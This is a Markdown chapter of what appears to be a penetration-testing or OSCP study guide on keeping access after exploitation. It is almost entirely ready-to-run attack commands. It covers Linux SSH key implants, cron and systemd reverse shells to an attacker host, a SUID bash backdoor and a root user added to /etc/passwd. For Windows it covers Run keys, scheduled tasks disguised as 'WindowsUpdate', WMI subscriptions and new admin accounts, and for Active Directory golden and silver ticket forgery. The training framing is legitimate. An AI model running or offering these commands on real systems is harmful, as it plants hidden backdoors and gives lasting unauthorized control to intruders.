# 🔒 Phase 10 — Persistence

> **Maintaining access after exploitation.** Useful for engagements — but remember: in CTF/HTB/THM, persistence is optional. In OSCP exam, focus on flags first, persistence is extra.

---

## Table of Contents
- [Linux Persistence](#linux-persistence)
- [Windows Persistence](#windows-persistence)
- [Active Directory Persistence](#active-directory-persistence)

---

## Linux Persistence

### SSH Authorized Keys

- [ ] **Add your public key to target's authorized_keys**:
  ```bash
  # Generate key pair on attacker
  ssh-keygen -t ed25519 -f /tmp/persist_key
  
  # Add to target's authorized_keys
  mkdir -p /home/<user>/.ssh
  echo "$(cat /tmp/persist_key.pub)" >> /home/<user>/.ssh/authorized_keys
  chmod 600 /home/<user>/.ssh/authorized_keys
  chmod 700 /home/<user>/.ssh
  
  # Connect back
  ssh -i /tmp/persist_key <user>@$IP
  ```

### Cron Job Backdoor

- [ ] **Add reverse shell to crontab**:
  ```bash
  # As current user
  (crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/<attacker>/4444 0>&1") | crontab -
  
  # As root (if you have root)
  echo '* * * * * root bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> /etc/crontab
  ```

### SUID Backdoor

```bash
# Create SUID shell as root
cp /bin/bash /tmp/.hidden_bash
chmod +s /tmp/.hidden_bash

# Use it later (as low-priv user)
/tmp/.hidden_bash -p
```

### Systemd Service (Root Required)

```bash
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

### /etc/passwd Backdoor

```bash
# Add root-level user with known password
# Generate hash: openssl passwd -1 'password'
echo 'backdoor:$1$SALT$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su backdoor
```

---

## Windows Persistence

### Registry Run Keys

- [ ] **Current user persistence**:
  ```cmd
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Temp\shell.exe" /f
  ```
- [ ] **All users persistence** (requires admin):
  ```cmd
  reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Temp\shell.exe" /f
  ```

### Scheduled Tasks

- [ ] **Create scheduled task** (admin):
  ```cmd
  schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM /f
  
  # Verify
  schtasks /query /tn "WindowsUpdate"
  ```
- [ ] **PowerShell scheduled task**:
  ```powershell
  $action = New-ScheduledTaskAction -Execute "C:\Temp\shell.exe"
  $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
  Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force
  ```

### New Local Admin Account

```cmd
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```

### Startup Folder

```cmd
copy C:\Temp\shell.exe "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
# Or for all users (admin required):
copy C:\Temp\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### WMI Event Subscription (Stealthy)

```powershell
# Creates a WMI event that runs shell every time system is idle
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" `
  -Arguments @{Name="UpdateFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; `
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" `
  -Arguments @{Name="UpdateConsumer"; CommandLineTemplate="C:\Temp\shell.exe"}

Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" `
  -Arguments @{Filter=$Filter; Consumer=$Consumer}
```

---

## Active Directory Persistence

### Golden Ticket (Domain Persistence)

After compromising the domain, the krbtgt hash enables forging tickets indefinitely:

```bash
# Dump krbtgt hash
python3 secretsdump.py <domain>/<da_user>:<pass>@<DC_IP> -just-dc-user krbtgt

# Get domain SID
python3 lookupsid.py <domain>/<user>:<pass>@<DC_IP>

# Forge golden ticket (Impacket)
python3 ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <SID> -domain <domain> <any_username>
export KRB5CCNAME=<any_username>.ccache
python3 psexec.py -k -no-pass <domain>/<any_username>@<DC_hostname>

# Or Mimikatz:
kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt
```

### Silver Ticket

Forge a TGS for a specific service (stealthier than golden):

```bash
# For CIFS service on target
python3 ticketer.py -nthash <service_account_hash> -domain-sid <SID> \
  -domain <domain> -spn cifs/<target_hostname> Administrator
```

### Add Domain Admin Account

```powershell
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain
```

---

## 🔗 References

- [HackTricks — Linux Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#persistence)
- [HackTricks — Windows Persistence](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/windows-persistence)
- [PayloadsAllTheThings — Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)

---

*[← Lateral Movement](../09_lateral_movement/README.md) · [Back to Main](../README.md) · [Objective Hunting →](../11_objective_hunting/README.md)*
